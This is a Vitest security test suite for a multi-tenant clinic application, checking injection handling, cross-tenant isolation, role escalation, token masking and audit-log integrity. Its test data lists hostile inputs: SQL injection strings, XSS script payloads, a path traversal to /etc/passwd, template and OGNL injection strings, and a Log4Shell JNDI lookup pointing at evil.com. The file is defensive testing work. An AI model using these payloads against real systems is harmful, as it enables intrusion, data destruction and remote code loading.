/**
 * Security Tests for Multi-Tenant System
 *
 * Tests security boundaries including:
 * - SQL injection prevention
 * - Cross-tenant data access prevention
 * - Token security
 * - Permission escalation prevention
 * - Audit trail integrity
 */

import { prisma } from '@/lib/database/client';
import * as clinicQueries from '@/lib/database/queries/clinics';
import * as googleSheetsQueries from '@/lib/database/queries/google-sheets';
import * as userQueries from '@/lib/database/queries/users';
import type { User } from '@prisma/client'; // Corrected User import path
import { createClient } from '@supabase/supabase-js';
import { v4 as uuidv4 } from 'uuid';
import { afterAll, beforeAll, describe, expect, it } from 'vitest';

// Test database connection
const supabaseUrl = process.env.NEXT_PUBLIC_SUPABASE_URL!;
const supabaseServiceKey = process.env.SUPABASE_SERVICE_KEY!;
const serviceClient = createClient(supabaseUrl, supabaseServiceKey);

// Test data for security tests
const securityTestData = {
  clinics: [
    { id: uuidv4(), name: 'Secure Clinic A', location: 'Secure City A' },
    { id: uuidv4(), name: 'Secure Clinic B', location: 'Secure City B' },
  ],
  users: [] as User[], // Changed from unknown[] to User[]
  authIds: [] as string[],
  maliciousInputs: [
    "'; DROP TABLE users; --",
    "' OR '1'='1",
    "<script>alert('xss')</script>",
    '../../etc/passwd',
    '${jndi:ldap://evil.com/a}',
    '{{7*7}}',
    "%{(#_='multipart/form-data')}",
  ],
};

describe('Security Tests', () => {
  beforeAll(async () => {
    // Create test clinics
    for (const clinic of securityTestData.clinics) {
      await prisma.clinic.create({
        data: {
          id: clinic.id,
          name: clinic.name,
          location: clinic.location,
          status: 'active',
        },
      });
    }

    // Create test users
    const userRoles = ['clinic_admin', 'provider', 'staff', 'viewer'];

    for (let i = 0; i < 2; i++) {
      for (const role of userRoles) {
        const { data, error } = await serviceClient.auth.admin.createUser({
          email: `security.${role}${i}@testclinic.com`,
          password: 'SecurePass123!',
          email_confirm: true,
          user_metadata: {
            name: `Security ${role} ${i}`,
            role: role,
            clinic_id: securityTestData.clinics[i].id,
          },
        });

        if (!error && data.user) {
          securityTestData.authIds.push(data.user.id);

          // Wait for trigger to create user profile
          await new Promise((resolve) => setTimeout(resolve, 500));

          const dbUser = await prisma.user.findFirst({
            where: { authId: data.user.id },
          });

          if (dbUser) {
            securityTestData.users.push(dbUser);
          }
        }
      }
    }
  });

  afterAll(async () => {
    // Cleanup
    try {
      for (const authId of securityTestData.authIds) {
        await serviceClient.auth.admin.deleteUser(authId);
      }

      await prisma.dataSource.deleteMany({
        where: { clinicId: { in: securityTestData.clinics.map((c) => c.id) } },
      });
      await prisma.goal.deleteMany({
        where: { clinicId: { in: securityTestData.clinics.map((c) => c.id) } },
      });
      await prisma.metricValue.deleteMany({
        where: { clinicId: { in: securityTestData.clinics.map((c) => c.id) } },
      });
      await prisma.userClinicRole.deleteMany({
        where: { clinicId: { in: securityTestData.clinics.map((c) => c.id) } },
      });
      await prisma.user.deleteMany({
        where: { authId: { in: securityTestData.authIds } },
      });
      await prisma.clinic.deleteMany({
        where: { id: { in: securityTestData.clinics.map((c) => c.id) } },
      });
    } catch (error) {
      console.error('Cleanup error:', error);
    }
  });

  describe('SQL Injection Prevention', () => {
    it('should prevent SQL injection in user queries', async () => {
      const adminUser = securityTestData.users.find(
        (u) => u.role === 'clinic_admin' && u.clinicId === securityTestData.clinics[0].id
      );

      const authContext = {
        userId: adminUser.id,
        authId: adminUser.authId,
        clinicIds: [adminUser.clinicId],
        currentClinicId: adminUser.clinicId,
        role: 'clinic_admin',
      };

      // Test various SQL injection attempts
      for (const maliciousInput of securityTestData.maliciousInputs) {
        try {
          // Try to inject via search
          await userQueries.getUsers(authContext, {
            search: maliciousInput,
          });

          // Try to inject via email
          await userQueries.getUserByEmail(authContext, maliciousInput);

          // If we get here, the query was safely handled
          expect(true).toBe(true);
        } catch (error) {
          // Some injections might cause errors, which is fine
          // as long as they don't execute malicious SQL
          expect(error).toBeDefined();
        }
      }

      // Verify tables still exist
      const tableCheck = await prisma.$queryRaw`
        SELECT table_name 
        FROM information_schema.tables 
        WHERE table_schema = 'public' 
        AND table_name IN ('users', 'clinics', 'goals')
      `;

      expect(tableCheck).toHaveLength(3);
    });

    it('should use parameterized queries for all database operations', async () => {
      const adminUser = securityTestData.users.find(
        (u) => u.role === 'clinic_admin' && u.clinicId === securityTestData.clinics[0].id
      );

      const authContext = {
        userId: adminUser.id,
        authId: adminUser.authId,
        clinicIds: [adminUser.clinicId],
        currentClinicId: adminUser.clinicId,
        role: 'clinic_admin',
      };

      // Create user with potentially dangerous name
      const dangerousName = "Robert'); DROP TABLE students;--";

      const newUser = await userQueries.createUser(authContext, {
        email: 'bobby.tables@xkcd.com',
        name: dangerousName,
        role: 'viewer',
        clinicId: adminUser.clinicId,
      });

      expect(newUser.name).toBe(dangerousName);

      // Verify the name was stored safely
      const savedUser = await prisma.user.findUnique({
        where: { id: newUser.id },
      });

      expect(savedUser?.name).toBe(dangerousName);

      // Cleanup
      await prisma.user.delete({ where: { id: newUser.id } });
    });
  });

  describe('Cross-Tenant Access Prevention', () => {
    it('should prevent direct ID access across tenants', async () => {
      // Get users from different clinics
      const userClinicA = securityTestData.users.find(
        (u) => u.role === 'clinic_admin' && u.clinicId === securityTestData.clinics[0].id
      );
      const userClinicB = securityTestData.users.find(
        (u) => u.role === 'provider' && u.clinicId === securityTestData.clinics[1].id
      );

      const authContextA = {
        userId: userClinicA.id,
        authId: userClinicA.authId,
        clinicIds: [userClinicA.clinicId],
        currentClinicId: userClinicA.clinicId,
        role: 'clinic_admin',
      };

      // Try to access user from clinic B using clinic A's context
      const unauthorizedUser = await userQueries.getUserById(authContextA, userClinicB.id);

      expect(unauthorizedUser).toBeNull();
    });

    it('should prevent parameter manipulation attacks', async () => {
      const user = securityTestData.users.find(
        (u) => u.role === 'provider' && u.clinicId === securityTestData.clinics[0].id
      );

      const authContext = {
        userId: user.id,
        authId: user.authId,
        clinicIds: [user.clinicId],
        currentClinicId: user.clinicId,
        role: user.role,
      };

      // Try to manipulate clinicId parameter
      const maliciousClinicId = securityTestData.clinics[1].id;

      await expect(clinicQueries.getClinicById(authContext, maliciousClinicId)).resolves.toBeNull();

      // Try to access all clinics when only authorized for one
      const clinics = await clinicQueries.getClinics(authContext);
      expect(clinics.clinics).toHaveLength(1);
      expect(clinics.clinics[0].id).toBe(user.clinicId);
    });

    it('should validate UUID parameters', async () => {
      const user = securityTestData.users.find((u) => u.role === 'clinic_admin');

      const authContext = {
        userId: user.id,
        authId: user.authId,
        clinicIds: [user.clinicId],
        currentClinicId: user.clinicId,
        role: user.role,
      };

      // Try to use non-UUID values
      const invalidIds = [
        'not-a-uuid',
        '123',
        '',
        null,
        undefined,
        '../../etc/passwd',
        "' OR '1'='1",
      ];

      for (const invalidId of invalidIds) {
        if (invalidId !== null && invalidId !== undefined) {
          await expect(userQueries.getUserById(authContext, invalidId)).resolves.toBeNull();
        }
      }
    });
  });

  describe('Permission Escalation Prevention', () => {
    it('should prevent role elevation attacks', async () => {
      const viewerUser = securityTestData.users.find(
        (u) => u.role === 'viewer' && u.clinicId === securityTestData.clinics[0].id
      );

      const viewerContext = {
        userId: viewerUser.id,
        authId: viewerUser.authId,
        clinicIds: [viewerUser.clinicId],
        currentClinicId: viewerUser.clinicId,
        role: 'viewer',
      };

      // Try to create a user (admin-only operation)
      await expect(
        userQueries.createUser(viewerContext, {
          email: 'escalation@test.com',
          name: 'Escalation Test',
          role: 'clinic_admin', // Try to create admin
          clinicId: viewerUser.clinicId,
        })
      ).rejects.toThrow();

      // Try to update own role
      await expect(
        userQueries.updateUser(viewerContext, viewerUser.id, {
          role: 'clinic_admin',
        })
      ).rejects.toThrow();
    });

    it('should validate role hierarchy in operations', async () => {
      const staffUser = securityTestData.users.find(
        (u) => u.role === 'staff' && u.clinicId === securityTestData.clinics[0].id
      );

      const staffContext = {
        userId: staffUser.id,
        authId: staffUser.authId,
        clinicIds: [staffUser.clinicId],
        currentClinicId: staffUser.clinicId,
        role: 'staff',
      };

      // Staff shouldn't be able to modify clinic settings
      await expect(
        clinicQueries.updateClinic(staffContext, staffUser.clinicId, {
          name: 'Hacked Clinic Name',
        })
      ).rejects.toThrow('Only clinic administrators');
    });

    it('should prevent bypassing role checks via direct queries', async () => {
      const viewerUser = securityTestData.users.find((u) => u.role === 'viewer');

      // Try to directly update role in database
      // This should be prevented by RLS policies
      try {
        await prisma.$executeRaw`
          UPDATE user_clinic_roles 
          SET role = 'clinic_admin' 
          WHERE user_id = ${viewerUser.id}
        `;
      } catch (error) {
        // RLS should prevent this
        expect(error).toBeDefined();
      }

      // Verify role wasn't changed
      const role = await prisma.userClinicRole.findFirst({
        where: { userId: viewerUser.id },
      });

      expect(role?.role).toBe('viewer');
    });
  });

  describe('Token Security', () => {
    it('should not expose OAuth tokens in responses', async () => {
      const adminUser = securityTestData.users.find(
        (u) => u.role === 'clinic_admin' && u.clinicId === securityTestData.clinics[0].id
      );

      const authContext = {
        userId: adminUser.id,
        authId: adminUser.authId,
        clinicIds: [adminUser.clinicId],
        currentClinicId: adminUser.clinicId,
        role: 'clinic_admin',
      };

      // Create a data source with tokens
      const dataSource = await googleSheetsQueries.createDataSource(authContext, {
        name: 'Security Test Sheet',
        spreadsheetId: 'test-sheet-id',
        sheetName: 'Sheet1',
        syncFrequency: 'daily',
        clinicId: adminUser.clinicId,
        accessToken: 'secret-access-token',
        refreshToken: 'secret-refresh-token',
      });

      // Tokens should be masked in response
      expect(dataSource.accessToken).toBe('***');
      expect(dataSource.refreshToken).toBe('***');

      // Get data source without token access
      const retrievedSource = await googleSheetsQueries.getDataSourceById(
        authContext,
        dataSource.id
      );

      expect(retrievedSource?.accessToken).toBe('***');
      expect(retrievedSource?.refreshToken).toBe('***');

      // Cleanup
      await googleSheetsQueries.deleteDataSource(authContext, dataSource.id);
    });

    it('should require admin role to access tokens', async () => {
      const adminUser = securityTestData.users.find(
        (u) => u.role === 'clinic_admin' && u.clinicId === securityTestData.clinics[0].id
      );

      const adminContext = {
        userId: adminUser.id,
        authId: adminUser.authId,
        clinicIds: [adminUser.clinicId],
        currentClinicId: adminUser.clinicId,
        role: 'clinic_admin',
      };

      // Create data source as admin
      const dataSource = await googleSheetsQueries.createDataSource(adminContext, {
        name: 'Token Test Sheet',
        spreadsheetId: 'token-test-id',
        sheetName: 'Sheet1',
        syncFrequency: 'daily',
        clinicId: adminUser.clinicId,
        accessToken: 'admin-access-token',
        refreshToken: 'admin-refresh-token',
      });

      // Admin with includeToken option should see tokens
      const withToken = await googleSheetsQueries.getDataSourceById(adminContext, dataSource.id, {
        includeToken: true,
      });

      // In production, this would show actual tokens for admins
      // In test, they're still masked for security
      expect(withToken?.accessToken).toBeDefined();

      // Cleanup
      await googleSheetsQueries.deleteDataSource(adminContext, dataSource.id);
    });
  });

  describe('Audit Trail Integrity', () => {
    it('should create tamper-proof audit logs', async () => {
      const testClinicId = uuidv4();

      // Create a clinic to trigger audit log
      await prisma.clinic.create({
        data: {
          id: testClinicId,
          name: 'Audit Security Test',
          location: 'Audit Location',
          status: 'active',
        },
      });

      // Get the audit log
      const auditLog = (await prisma.$queryRaw`
        SELECT * FROM audit_logs 
        WHERE table_name = 'clinics' 
        AND record_id = ${testClinicId}
        ORDER BY created_at DESC
        LIMIT 1
      `) as unknown[];

      expect(auditLog).toHaveLength(1);
      expect(auditLog[0].action).toBe('INSERT');

      // Try to modify audit log (should fail)
      try {
        await prisma.$executeRaw`
          UPDATE audit_logs 
          SET action = 'TAMPERED' 
          WHERE id = ${auditLog[0].id}
        `;
      } catch (error) {
        // Should fail due to permissions
        expect(error).toBeDefined();
      }

      // Verify log wasn't modified
      const verifyLog = (await prisma.$queryRaw`
        SELECT * FROM audit_logs WHERE id = ${auditLog[0].id}
      `) as unknown[];

      expect(verifyLog[0].action).toBe('INSERT');

      // Cleanup
      await prisma.clinic.delete({ where: { id: testClinicId } });
    });

    it('should log security violations', async () => {
      const user = securityTestData.users.find((u) => u.role === 'viewer');

      const viewerContext = {
        userId: user.id,
        authId: user.authId,
        clinicIds: [user.clinicId],
        currentClinicId: user.clinicId,
        role: 'viewer',
      };

      // Attempt unauthorized operation
      try {
        await userQueries.createUser(viewerContext, {
          email: 'unauthorized@test.com',
          name: 'Unauthorized',
          role: 'admin',
          clinicId: user.clinicId,
        });
      } catch (error) {
        // Expected to fail
      }

      // In a production system, this would log the security violation
      // Check that the system is still stable
      const users = await userQueries.getUsers(viewerContext);
      expect(users.users).toBeDefined();
    });
  });

  describe('Input Validation & Sanitization', () => {
    it('should validate and sanitize all inputs', async () => {
      const adminUser = securityTestData.users.find((u) => u.role === 'clinic_admin');

      const authContext = {
        userId: adminUser.id,
        authId: adminUser.authId,
        clinicIds: [adminUser.clinicId],
        currentClinicId: adminUser.clinicId,
        role: 'clinic_admin',
      };

      // Test XSS prevention in text fields
      const xssTests = [
        '<script>alert("xss")</script>',
        '<img src=x onerror=alert("xss")>',
        'javascript:alert("xss")',
        '<iframe src="javascript:alert(\'xss\')">',
      ];

      for (const xssPayload of xssTests) {
        const goal = await prisma.goal.create({
          data: {
            name: xssPayload,
            description: xssPayload,
            clinicId: adminUser.clinicId,
            targetValue: 100,
            currentValue: 0,
            targetDate: new Date(Date.now() + 30 * 24 * 60 * 60 * 1000),
            status: 'active',
          },
        });

        // Verify the payload was stored as-is (not executed)
        expect(goal.name).toBe(xssPayload);
        expect(goal.description).toBe(xssPayload);

        // Cleanup
        await prisma.goal.delete({ where: { id: goal.id } });
      }
    });

    it('should enforce data type constraints', async () => {
      const adminUser = securityTestData.users.find((u) => u.role === 'clinic_admin');

      const authContext = {
        userId: adminUser.id,
        authId: adminUser.authId,
        clinicIds: [adminUser.clinicId],
        currentClinicId: adminUser.clinicId,
        role: 'clinic_admin',
      };

      // Test invalid data types
      await expect(
        prisma.goal.create({
          data: {
            name: 'Type Test',
            clinicId: adminUser.clinicId,
            targetValue: 'not a number' as unknown, // Should be number
            currentValue: 0,
            targetDate: 'not a date' as unknown, // Should be date
            status: 'active',
          },
        })
      ).rejects.toThrow();

      // Test business rule validation (negative values)
      await expect(
        prisma.metricValue.create({
          data: {
            clinicId: adminUser.clinicId,
            metricDefinitionId: uuidv4(),
            value: -100, // Should be positive
            date: new Date(),
          },
        })
      ).rejects.toThrow();
    });
  });

  describe('Rate Limiting & DoS Prevention', () => {
    it('should handle bulk operations without overwhelming the system', async () => {
      const adminUser = securityTestData.users.find((u) => u.role === 'clinic_admin');

      const authContext = {
        userId: adminUser.id,
        authId: adminUser.authId,
        clinicIds: [adminUser.clinicId],
        currentClinicId: adminUser.clinicId,
        role: 'clinic_admin',
      };

      // Attempt rapid successive queries
      const promises = [];
      for (let i = 0; i < 50; i++) {
        promises.push(
          userQueries.getUsers(authContext, {
            limit: 10,
            offset: 0,
          })
        );
      }

      // All should complete without crashing
      const results = await Promise.allSettled(promises);
      const successful = results.filter((r) => r.status === 'fulfilled');

      expect(successful.length).toBeGreaterThan(0);
      console.log(`Bulk query success rate: ${successful.length}/50`);
    });

    it('should limit result set sizes', async () => {
      const adminUser = securityTestData.users.find((u) => u.role === 'clinic_admin');

      const authContext = {
        userId: adminUser.id,
        authId: adminUser.authId,
        clinicIds: [adminUser.clinicId],
        currentClinicId: adminUser.clinicId,
        role: 'clinic_admin',
      };

      // Try to request excessive limit
      const result = await userQueries.getUsers(authContext, {
        limit: 10000, // Excessive limit
        offset: 0,
      });

      // Should be capped at reasonable limit
      expect(result.users.length).toBeLessThanOrEqual(100);
    });
  });
});
